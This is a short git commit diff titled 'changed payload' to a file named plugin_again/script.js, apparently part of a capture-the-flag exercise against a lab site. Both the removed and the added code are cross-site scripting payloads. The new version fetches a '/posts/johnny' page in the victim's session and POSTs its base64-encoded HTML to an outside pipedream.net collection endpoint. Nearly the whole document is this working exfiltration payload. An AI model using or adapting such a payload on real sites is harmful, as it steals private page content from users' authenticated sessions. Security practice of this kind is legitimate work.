7d4ffd62c83dca27b27eee535e973b96fc432a7a
furtest <paul.retourne@orange.fr>
2023-11-24 09:05:21 +0100

    changed payload

--- plugin_again/script.js
+++ plugin_again/script.js
@@ -1,3 +1,2 @@
-document.location = "https://website-kueqer.inst.malicecyber.com/posts/Johnny";
-fetch("https://eof01qmn38c7xfu.m.pipedream.net/johnny", {method: "POST", body: btoa(unescape(encodeURIComponent(document.body.outerHTML)))});
-alert("End of execution");
+fetch('/posts/johnny').then(function (response) {return response.text();}).then(function (html) { 
+fetch("https://eof01qmn38c7xfu.m.pipedream.net/johnny", {method: "POST", body: btoa(unescape(encodeURIComponent(html)))})});
